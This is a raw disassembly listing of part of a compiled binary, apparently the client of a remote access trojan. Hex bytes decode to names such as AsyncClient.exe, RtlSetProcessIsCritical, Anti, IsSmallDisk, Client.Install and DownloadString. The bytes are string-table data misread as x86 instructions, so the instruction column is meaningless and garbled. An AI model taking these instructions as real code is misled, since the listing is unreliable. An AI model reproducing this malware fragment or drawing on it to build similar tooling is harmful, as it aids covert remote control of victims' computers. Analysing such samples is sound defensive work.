  4081e5:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081ec:	65 66 61             	gs popaw
  4081ef:	75 6c                	jne    0x40825d
  4081f1:	74 4d                	je     0x408240
  4081f3:	65 6d                	gs insl (%dx),%es:(%edi)
  4081f5:	62 65 72             	bound  %esp,0x72(%ebp)
  4081f8:	41                   	inc    %ecx
  4081f9:	74 74                	je     0x40826f
  4081fb:	72 69                	jb     0x408266
  4081fd:	62 75 74             	bound  %esi,0x74(%ebp)
  408200:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408204:	6d                   	insl   (%dx),%es:(%edi)
  408205:	70 69                	jo     0x408270
  408207:	6c                   	insb   (%dx),%es:(%edi)
  408208:	61                   	popa
  408209:	74 69                	je     0x408274
  40820b:	6f                   	outsl  %ds:(%esi),(%dx)
  40820c:	6e                   	outsb  %ds:(%esi),(%dx)
  40820d:	52                   	push   %edx
  40820e:	65 6c                	gs insb (%dx),%es:(%edi)
  408210:	61                   	popa
  408211:	78 61                	js     0x408274
  408213:	74 69                	je     0x40827e
  408215:	6f                   	outsl  %ds:(%esi),(%dx)
  408216:	6e                   	outsb  %ds:(%esi),(%dx)
  408217:	73 41                	jae    0x40825a
  408219:	74 74                	je     0x40828f
  40821b:	72 69                	jb     0x408286
  40821d:	62 75 74             	bound  %esi,0x74(%ebp)
  408220:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408224:	73 65                	jae    0x40828b
  408226:	6d                   	insl   (%dx),%es:(%edi)
  408227:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40822b:	72 6f                	jb     0x40829c
  40822d:	64 75 63             	fs jne 0x408293
  408230:	74 41                	je     0x408273
  408232:	74 74                	je     0x4082a8
  408234:	72 69                	jb     0x40829f
  408236:	62 75 74             	bound  %esi,0x74(%ebp)
  408239:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40823d:	73 65                	jae    0x4082a4
  40823f:	6d                   	insl   (%dx),%es:(%edi)
  408240:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408244:	6f                   	outsl  %ds:(%esi),(%dx)
  408245:	70 79                	jo     0x4082c0
  408247:	72 69                	jb     0x4082b2
  408249:	67 68 74 41 74 74    	addr16 push $0x74744174
  40824f:	72 69                	jb     0x4082ba
  408251:	62 75 74             	bound  %esi,0x74(%ebp)
  408254:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408258:	73 65                	jae    0x4082bf
  40825a:	6d                   	insl   (%dx),%es:(%edi)
  40825b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40825f:	6f                   	outsl  %ds:(%esi),(%dx)
  408260:	6d                   	insl   (%dx),%es:(%edi)
  408261:	70 61                	jo     0x4082c4
  408263:	6e                   	outsb  %ds:(%esi),(%dx)
  408264:	79 41                	jns    0x4082a7
  408266:	74 74                	je     0x4082dc
  408268:	72 69                	jb     0x4082d3
  40826a:	62 75 74             	bound  %esi,0x74(%ebp)
  40826d:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408271:	6e                   	outsb  %ds:(%esi),(%dx)
  408272:	74 69                	je     0x4082dd
  408274:	6d                   	insl   (%dx),%es:(%edi)
  408275:	65 43                	gs inc %ebx
  408277:	6f                   	outsl  %ds:(%esi),(%dx)
  408278:	6d                   	insl   (%dx),%es:(%edi)
  408279:	70 61                	jo     0x4082dc
  40827b:	74 69                	je     0x4082e6
  40827d:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408280:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408287:	69 
  408288:	62 75 74             	bound  %esi,0x74(%ebp)
  40828b:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40828f:	74 5f                	je     0x4082f0
  408291:	55                   	push   %ebp
  408292:	73 65                	jae    0x4082f9
  408294:	53                   	push   %ebx
  408295:	68 65 6c 6c 45       	push   $0x456c6c65
  40829a:	78 65                	js     0x408301
  40829c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40829f:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082a3:	61                   	popa
  4082a4:	64 42                	fs inc %edx
  4082a6:	79 74                	jns    0x40831c
  4082a8:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082ac:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082b3:	00 
  4082b4:	44                   	inc    %esp
  4082b5:	65 6c                	gs insb (%dx),%es:(%edi)
  4082b7:	65 74 65             	gs je  0x40831f
  4082ba:	56                   	push   %esi
  4082bb:	61                   	popa
  4082bc:	6c                   	insb   (%dx),%es:(%edi)
  4082bd:	75 65                	jne    0x408324
  4082bf:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4082c3:	65 72 56             	gs jb  0x40831c
  4082c6:	61                   	popa
  4082c7:	6c                   	insb   (%dx),%es:(%edi)
  4082c8:	75 65                	jne    0x40832f
  4082ca:	00 47 65             	add    %al,0x65(%edi)
  4082cd:	74 56                	je     0x408325
  4082cf:	61                   	popa
  4082d0:	6c                   	insb   (%dx),%es:(%edi)
  4082d1:	75 65                	jne    0x408338
  4082d3:	00 53 65             	add    %dl,0x65(%ebx)
  4082d6:	74 56                	je     0x40832e
  4082d8:	61                   	popa
  4082d9:	6c                   	insb   (%dx),%es:(%edi)
  4082da:	75 65                	jne    0x408341
  4082dc:	00 76 61             	add    %dh,0x61(%esi)
  4082df:	6c                   	insb   (%dx),%es:(%edi)
  4082e0:	75 65                	jne    0x408347
  4082e2:	00 67 65             	add    %ah,0x65(%edi)
  4082e5:	74 5f                	je     0x408346
  4082e7:	4b                   	dec    %ebx
  4082e8:	65 65 70 41          	gs gs jo 0x40832d
  4082ec:	6c                   	insb   (%dx),%es:(%edi)
  4082ed:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4082f4:	5f                   	pop    %edi
  4082f5:	4b                   	dec    %ebx
  4082f6:	65 65 70 41          	gs gs jo 0x40833b
  4082fa:	6c                   	insb   (%dx),%es:(%edi)
  4082fb:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408302:	6f                   	outsl  %ds:(%esi),(%dx)
  408303:	76 65                	jbe    0x40836a
  408305:	00 41 73             	add    %al,0x73(%ecx)
  408308:	79 6e                	jns    0x408378
  40830a:	63 43 6c             	arpl   %eax,0x6c(%ebx)
  40830d:	69 65 6e 74 2e 65 78 	imul   $0x78652e74,0x6e(%ebp),%esp
  408314:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408318:	74 5f                	je     0x408379
  40831a:	42                   	inc    %edx
  40831b:	6c                   	insb   (%dx),%es:(%edi)
  40831c:	6f                   	outsl  %ds:(%esi),(%dx)
  40831d:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408320:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408327:	5f                   	pop    %edi
  408328:	54                   	push   %esp
  408329:	6f                   	outsl  %ds:(%esi),(%dx)
  40832a:	74 61                	je     0x40838d
  40832c:	6c                   	insb   (%dx),%es:(%edi)
  40832d:	53                   	push   %ebx
  40832e:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408335:	5f                   	pop    %edi
  408336:	48                   	dec    %eax
  408337:	65 61                	gs popa
  408339:	64 65 72 53          	fs gs jb 0x408390
  40833d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408344:	5f                   	pop    %edi
  408345:	48                   	dec    %eax
  408346:	65 61                	gs popa
  408348:	64 65 72 53          	fs gs jb 0x40839f
  40834c:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408353:	5f                   	pop    %edi
  408354:	53                   	push   %ebx
  408355:	65 6e                	outsb  %gs:(%esi),(%dx)
  408357:	64 42                	fs inc %edx
  408359:	75 66                	jne    0x4083c1
  40835b:	66 65 72 53          	data16 gs jb 0x4083b2
  40835f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408366:	5f                   	pop    %edi
  408367:	52                   	push   %edx
  408368:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40836c:	76 65                	jbe    0x4083d3
  40836e:	42                   	inc    %edx
  40836f:	75 66                	jne    0x4083d7
  408371:	66 65 72 53          	data16 gs jb 0x4083c8
  408375:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40837c:	5f                   	pop    %edi
  40837d:	4b                   	dec    %ebx
  40837e:	65 79 53             	gs jns 0x4083d4
  408381:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  408388:	65 78 4f             	gs js  0x4083da
  40838b:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  40838f:	72 46                	jb     0x4083d7
  408391:	6c                   	insb   (%dx),%es:(%edi)
  408392:	61                   	popa
  408393:	67 00 43 72          	add    %al,0x72(%bp,%di)
  408397:	79 70                	jns    0x408409
  408399:	74 6f                	je     0x40840a
  40839b:	43                   	inc    %ebx
  40839c:	6f                   	outsl  %ds:(%esi),(%dx)
  40839d:	6e                   	outsb  %ds:(%esi),(%dx)
  40839e:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083a4:	74 5f                	je     0x408405
  4083a6:	50                   	push   %eax
  4083a7:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083ae:	5f                   	pop    %edi
  4083af:	50                   	push   %eax
  4083b0:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083b7:	74 65                	je     0x40841e
  4083b9:	6d                   	insl   (%dx),%es:(%edi)
  4083ba:	2e 54                	cs push %esp
  4083bc:	68 72 65 61 64       	push   $0x64616572
  4083c1:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083c8:	5f                   	pop    %edi
  4083c9:	50                   	push   %eax
  4083ca:	61                   	popa
  4083cb:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083d2:	64 64 
  4083d4:	5f                   	pop    %edi
  4083d5:	53                   	push   %ebx
  4083d6:	65 73 73             	gs jae 0x40844c
  4083d9:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e1:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083e5:	73 74                	jae    0x40845b
  4083e7:	65 6d                	gs insl (%dx),%es:(%edi)
  4083e9:	45                   	inc    %ebp
  4083ea:	76 65                	jbe    0x408451
  4083ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ed:	74 73                	je     0x408462
  4083ef:	5f                   	pop    %edi
  4083f0:	53                   	push   %ebx
  4083f1:	65 73 73             	gs jae 0x408467
  4083f4:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4083fc:	67 00 55 54          	add    %dl,0x54(%di)
  408400:	46                   	inc    %esi
  408401:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408404:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408407:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40840e:	74 65                	je     0x408475
  408410:	6d                   	insl   (%dx),%es:(%edi)
  408411:	2e 44                	cs inc %esp
  408413:	72 61                	jb     0x408476
  408415:	77 69                	ja     0x408480
  408417:	6e                   	outsb  %ds:(%esi),(%dx)
  408418:	67 2e 49             	addr16 cs dec %ecx
  40841b:	6d                   	insl   (%dx),%es:(%edi)
  40841c:	61                   	popa
  40841d:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408424:	73 
  408425:	74 65                	je     0x40848c
  408427:	6d                   	insl   (%dx),%es:(%edi)
  408428:	2e 52                	cs push %edx
  40842a:	75 6e                	jne    0x40849a
  40842c:	74 69                	je     0x408497
  40842e:	6d                   	insl   (%dx),%es:(%edi)
  40842f:	65 2e 56             	gs cs push %esi
  408432:	65 72 73             	gs jb  0x4084a8
  408435:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40843c:	46                   	inc    %esi
  40843d:	72 6f                	jb     0x4084ae
  40843f:	6d                   	insl   (%dx),%es:(%edi)
  408440:	42                   	inc    %edx
  408441:	61                   	popa
  408442:	73 65                	jae    0x4084a9
  408444:	36 34 53             	ss xor $0x53,%al
  408447:	74 72                	je     0x4084bb
  408449:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408450:	61                   	popa
  408451:	73 65                	jae    0x4084b8
  408453:	36 34 53             	ss xor $0x53,%al
  408456:	74 72                	je     0x4084ca
  408458:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  40845f:	64 53                	fs push %ebx
  408461:	74 72                	je     0x4084d5
  408463:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  40846a:	6e                   	outsb  %ds:(%esi),(%dx)
  40846b:	6c                   	insb   (%dx),%es:(%edi)
  40846c:	6f                   	outsl  %ds:(%esi),(%dx)
  40846d:	61                   	popa
  40846e:	64 53                	fs push %ebx
  408470:	74 72                	je     0x4084e4
  408472:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  408479:	74 65                	je     0x4084e0
  40847b:	53                   	push   %ebx
  40847c:	74 72                	je     0x4084f0
  40847e:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408485:	74 72                	je     0x4084f9
  408487:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40848e:	5f                   	pop    %edi
  40848f:	41                   	inc    %ecx
  408490:	73 53                	jae    0x4084e5
  408492:	74 72                	je     0x408506
  408494:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40849b:	5f                   	pop    %edi
  40849c:	41                   	inc    %ecx
  40849d:	73 53                	jae    0x4084f2
  40849f:	74 72                	je     0x408513
  4084a1:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084a8:	65 73 41             	gs jae 0x4084ec
  4084ab:	73 53                	jae    0x408500
  4084ad:	74 72                	je     0x408521
  4084af:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084b6:	41                   	inc    %ecx
  4084b7:	73 53                	jae    0x40850c
  4084b9:	74 72                	je     0x40852d
  4084bb:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084c2:	41                   	inc    %ecx
  4084c3:	73 53                	jae    0x408518
  4084c5:	74 72                	je     0x408539
  4084c7:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084ce:	53                   	push   %ebx
  4084cf:	74 72                	je     0x408543
  4084d1:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084d8:	65 73 41             	gs jae 0x40851c
  4084db:	73 48                	jae    0x408525
  4084dd:	65 78 53             	gs js  0x408533
  4084e0:	74 72                	je     0x408554
  4084e2:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084e9:	73 74                	jae    0x40855f
  4084eb:	72 69                	jb     0x408556
  4084ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ee:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084f2:	73 74                	jae    0x408568
  4084f4:	65 6d                	gs insl (%dx),%es:(%edi)
  4084f6:	2e 44                	cs inc %esp
  4084f8:	72 61                	jb     0x40855b
  4084fa:	77 69                	ja     0x408565
  4084fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4084fd:	67 00 67 65          	add    %ah,0x65(%bx)
  408501:	74 5f                	je     0x408562
  408503:	41                   	inc    %ecx
  408504:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408508:	61                   	popa
  408509:	74 65                	je     0x408570
  40850b:	50                   	push   %eax
  40850c:	6f                   	outsl  %ds:(%esi),(%dx)
  40850d:	6e                   	outsb  %ds:(%esi),(%dx)
  40850e:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408512:	74 5f                	je     0x408573
  408514:	41                   	inc    %ecx
  408515:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408519:	61                   	popa
  40851a:	74 65                	je     0x408581
  40851c:	50                   	push   %eax
  40851d:	6f                   	outsl  %ds:(%esi),(%dx)
  40851e:	6e                   	outsb  %ds:(%esi),(%dx)
  40851f:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408523:	74 5f                	je     0x408584
  408525:	45                   	inc    %ebp
  408526:	72 72                	jb     0x40859a
  408528:	6f                   	outsl  %ds:(%esi),(%dx)
  408529:	72 44                	jb     0x40856f
  40852b:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408532:	73 67                	jae    0x40859b
  408534:	00 43 6f             	add    %al,0x6f(%ebx)
  408537:	6d                   	insl   (%dx),%es:(%edi)
  408538:	70 75                	jo     0x4085af
  40853a:	74 65                	je     0x4085a1
  40853c:	48                   	dec    %eax
  40853d:	61                   	popa
  40853e:	73 68                	jae    0x4085a8
  408540:	00 73 74             	add    %dh,0x74(%ebx)
  408543:	72 54                	jb     0x408599
  408545:	6f                   	outsl  %ds:(%esi),(%dx)
  408546:	48                   	dec    %eax
  408547:	61                   	popa
  408548:	73 68                	jae    0x4085b2
  40854a:	00 47 65             	add    %al,0x65(%edi)
  40854d:	74 48                	je     0x408597
  40854f:	61                   	popa
  408550:	73 68                	jae    0x4085ba
  408552:	00 56 65             	add    %dl,0x65(%esi)
  408555:	72 69                	jb     0x4085c0
  408557:	66 79 48             	data16 jns 0x4085a2
  40855a:	61                   	popa
  40855b:	73 68                	jae    0x4085c5
  40855d:	00 46 6c             	add    %al,0x6c(%esi)
  408560:	75 73                	jne    0x4085d5
  408562:	68 00 67 65 74       	push   $0x74656700
  408567:	5f                   	pop    %edi
  408568:	45                   	inc    %ebp
  408569:	78 65                	js     0x4085d0
  40856b:	63 75 74             	arpl   %esi,0x74(%ebp)
  40856e:	61                   	popa
  40856f:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408573:	61                   	popa
  408574:	74 68                	je     0x4085de
  408576:	00 47 65             	add    %al,0x65(%edi)
  408579:	74 54                	je     0x4085cf
  40857b:	65 6d                	gs insl (%dx),%es:(%edi)
  40857d:	70 50                	jo     0x4085cf
  40857f:	61                   	popa
  408580:	74 68                	je     0x4085ea
  408582:	00 70 61             	add    %dh,0x61(%eax)
  408585:	74 68                	je     0x4085ef
  408587:	00 48 6d             	add    %cl,0x6d(%eax)
  40858a:	61                   	popa
  40858b:	63 53 68             	arpl   %edx,0x68(%ebx)
  40858e:	61                   	popa
  40858f:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  408595:	67 74 68             	addr16 je 0x408600
  408598:	00 67 65             	add    %ah,0x65(%edi)
  40859b:	74 5f                	je     0x4085fc
  40859d:	4c                   	dec    %esp
  40859e:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a0:	67 74 68             	addr16 je 0x40860b
  4085a3:	00 49 76             	add    %cl,0x76(%ecx)
  4085a6:	4c                   	dec    %esp
  4085a7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a9:	67 74 68             	addr16 je 0x408614
  4085ac:	00 41 75             	add    %al,0x75(%ecx)
  4085af:	74 68                	je     0x408619
  4085b1:	4b                   	dec    %ebx
  4085b2:	65 79 4c             	gs jns 0x408601
  4085b5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085b7:	67 74 68             	addr16 je 0x408622
  4085ba:	00 55 72             	add    %dl,0x72(%ebp)
  4085bd:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085c3:	00 6d 73             	add    %ch,0x73(%ebp)
  4085c6:	67 70 61             	addr16 jo 0x40862a
  4085c9:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085cc:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085cf:	6c                   	insb   (%dx),%es:(%edi)
  4085d0:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d8:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085db:	4d                   	dec    %ebp
  4085dc:	65 73 73             	gs jae 0x408652
  4085df:	61                   	popa
  4085e0:	67 65 50             	addr16 gs push %eax
  4085e3:	61                   	popa
  4085e4:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085e7:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085ee:	61                   	popa
  4085ef:	67 65 50             	addr16 gs push %eax
  4085f2:	61                   	popa
  4085f3:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085f6:	4d                   	dec    %ebp
  4085f7:	73 67                	jae    0x408660
  4085f9:	50                   	push   %eax
  4085fa:	61                   	popa
  4085fb:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085fe:	41                   	inc    %ecx
  4085ff:	73 79                	jae    0x40867a
  408601:	6e                   	outsb  %ds:(%esi),(%dx)
  408602:	63 43 61             	arpl   %eax,0x61(%ebx)
  408605:	6c                   	insb   (%dx),%es:(%edi)
  408606:	6c                   	insb   (%dx),%es:(%edi)
  408607:	62 61 63             	bound  %esp,0x63(%ecx)
  40860a:	6b 00 52             	imul   $0x52,(%eax),%eax
  40860d:	65 6d                	gs insl (%dx),%es:(%edi)
  40860f:	6f                   	outsl  %ds:(%esi),(%dx)
  408610:	74 65                	je     0x408677
  408612:	43                   	inc    %ebx
  408613:	65 72 74             	gs jb  0x40868a
  408616:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40861d:	56                   	push   %esi
  40861e:	61                   	popa
  40861f:	6c                   	insb   (%dx),%es:(%edi)
  408620:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408627:	43 
  408628:	61                   	popa
  408629:	6c                   	insb   (%dx),%es:(%edi)
  40862a:	6c                   	insb   (%dx),%es:(%edi)
  40862b:	62 61 63             	bound  %esp,0x63(%ecx)
  40862e:	6b 00 54             	imul   $0x54,(%eax),%eax
  408631:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408638:	6c                   	insb   (%dx),%es:(%edi)
  408639:	62 61 63             	bound  %esp,0x63(%ecx)
  40863c:	6b 00 75             	imul   $0x75,(%eax),%eax
  40863f:	6e                   	outsb  %ds:(%esi),(%dx)
  408640:	70 61                	jo     0x4086a3
  408642:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  408645:	6d                   	insl   (%dx),%es:(%edi)
  408646:	73 67                	jae    0x4086af
  408648:	70 61                	jo     0x4086ab
  40864a:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40864d:	52                   	push   %edx
  40864e:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408655:	4b 65 
  408657:	79 50                	jns    0x4086a9
  408659:	65 72 6d             	gs jb  0x4086c9
  40865c:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408663:	68 65 63 6b 00       	push   $0x6b6365
  408668:	46                   	inc    %esi
  408669:	6c                   	insb   (%dx),%es:(%edi)
  40866a:	75 73                	jne    0x4086df
  40866c:	68 46 69 6e 61       	push   $0x616e6946
  408671:	6c                   	insb   (%dx),%es:(%edi)
  408672:	42                   	inc    %edx
  408673:	6c                   	insb   (%dx),%es:(%edi)
  408674:	6f                   	outsl  %ds:(%esi),(%dx)
  408675:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408678:	49                   	dec    %ecx
  408679:	73 53                	jae    0x4086ce
  40867b:	6d                   	insl   (%dx),%es:(%edi)
  40867c:	61                   	popa
  40867d:	6c                   	insb   (%dx),%es:(%edi)
  40867e:	6c                   	insb   (%dx),%es:(%edi)
  40867f:	44                   	inc    %esp
  408680:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  408687:	6c                   	insb   (%dx),%es:(%edi)
  408688:	00 66 56             	add    %ah,0x56(%esi)
  40868b:	61                   	popa
  40868c:	6c                   	insb   (%dx),%es:(%edi)
  40868d:	00 69 56             	add    %ch,0x56(%ecx)
  408690:	61                   	popa
  408691:	6c                   	insb   (%dx),%es:(%edi)
  408692:	00 73 74             	add    %dh,0x74(%ebx)
  408695:	72 56                	jb     0x4086ed
  408697:	61                   	popa
  408698:	6c                   	insb   (%dx),%es:(%edi)
  408699:	00 52 74             	add    %dl,0x74(%edx)
  40869c:	6c                   	insb   (%dx),%es:(%edi)
  40869d:	53                   	push   %ebx
  40869e:	65 74 50             	gs je  0x4086f1
  4086a1:	72 6f                	jb     0x408712
  4086a3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086a6:	73 49                	jae    0x4086f1
  4086a8:	73 43                	jae    0x4086ed
  4086aa:	72 69                	jb     0x408715
  4086ac:	74 69                	je     0x408717
  4086ae:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086b1:	00 50 72             	add    %dl,0x72(%eax)
  4086b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086b8:	73 43                	jae    0x4086fd
  4086ba:	72 69                	jb     0x408725
  4086bc:	74 69                	je     0x408727
  4086be:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086c1:	00 4e 65             	add    %cl,0x65(%esi)
  4086c4:	74 77                	je     0x40873d
  4086c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c7:	72 6b                	jb     0x408734
  4086c9:	43                   	inc    %ebx
  4086ca:	72 65                	jb     0x408731
  4086cc:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086cf:	74 69                	je     0x40873a
  4086d1:	61                   	popa
  4086d2:	6c                   	insb   (%dx),%es:(%edi)
  4086d3:	00 53 79             	add    %dl,0x79(%ebx)
  4086d6:	73 74                	jae    0x40874c
  4086d8:	65 6d                	gs insl (%dx),%es:(%edi)
  4086da:	2e 53                	cs push %ebx
  4086dc:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086e0:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086e7:	6e 
  4086e8:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086eb:	61                   	popa
  4086ec:	6c                   	insb   (%dx),%es:(%edi)
  4086ed:	00 57 69             	add    %dl,0x69(%edi)
  4086f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f1:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086f3:	77 73                	ja     0x408768
  4086f5:	50                   	push   %eax
  4086f6:	72 69                	jb     0x408761
  4086f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f9:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086fc:	61                   	popa
  4086fd:	6c                   	insb   (%dx),%es:(%edi)
  4086fe:	00 41 72             	add    %al,0x72(%ecx)
  408701:	65 45                	gs inc %ebp
  408703:	71 75                	jno    0x40877a
  408705:	61                   	popa
  408706:	6c                   	insb   (%dx),%es:(%edi)
  408707:	00 67 65             	add    %ah,0x65(%edi)
  40870a:	74 5f                	je     0x40876b
  40870c:	49                   	dec    %ecx
  40870d:	6e                   	outsb  %ds:(%esi),(%dx)
  40870e:	74 65                	je     0x408775
  408710:	72 76                	jb     0x408788
  408712:	61                   	popa
  408713:	6c                   	insb   (%dx),%es:(%edi)
  408714:	00 73 65             	add    %dh,0x65(%ebx)
  408717:	74 5f                	je     0x408778
  408719:	49                   	dec    %ecx
  40871a:	6e                   	outsb  %ds:(%esi),(%dx)
  40871b:	74 65                	je     0x408782
  40871d:	72 76                	jb     0x408795
  40871f:	61                   	popa
  408720:	6c                   	insb   (%dx),%es:(%edi)
  408721:	00 43 6c             	add    %al,0x6c(%ebx)
  408724:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  40872b:	73 74                	jae    0x4087a1
  40872d:	61                   	popa
  40872e:	6c                   	insb   (%dx),%es:(%edi)
  40872f:	6c                   	insb   (%dx),%es:(%edi)
  408730:	00 6b 65             	add    %ch,0x65(%ebx)
  408733:	72 6e                	jb     0x4087a3
  408735:	65 6c                	gs insb (%dx),%es:(%edi)
  408737:	33 32                	xor    (%edx),%esi
  408739:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40873c:	6c                   	insb   (%dx),%es:(%edi)
  40873d:	00 75 73             	add    %dh,0x73(%ebp)
  408740:	65 72 33             	gs jb  0x408776
  408743:	32 2e                	xor    (%esi),%ch
  408745:	64 6c                	fs insb (%dx),%es:(%edi)
  408747:	6c                   	insb   (%dx),%es:(%edi)
  408748:	00 6e 74             	add    %ch,0x74(%esi)
  40874b:	64 6c                	fs insb (%dx),%es:(%edi)
  40874d:	6c                   	insb   (%dx),%es:(%edi)
  40874e:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408751:	6c                   	insb   (%dx),%es:(%edi)
  408752:	00 4b 69             	add    %cl,0x69(%ebx)
  408755:	6c                   	insb   (%dx),%es:(%edi)
  408756:	6c                   	insb   (%dx),%es:(%edi)
  408757:	00 50 6f             	add    %dl,0x6f(%eax)
  40875a:	6c                   	insb   (%dx),%es:(%edi)
  40875b:	6c                   	insb   (%dx),%es:(%edi)
